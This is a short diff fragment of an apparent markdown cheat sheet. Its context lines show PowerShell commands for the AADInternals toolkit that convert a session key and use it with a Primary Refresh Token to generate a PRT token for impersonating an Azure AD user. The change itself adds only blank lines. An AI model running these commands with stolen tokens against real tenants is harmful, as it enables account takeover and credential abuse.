@@ -36,3 +36,5 @@ PS AADInternals> $ClearKey = "XXYYZZ..."
 PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
 PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 ```
+
+
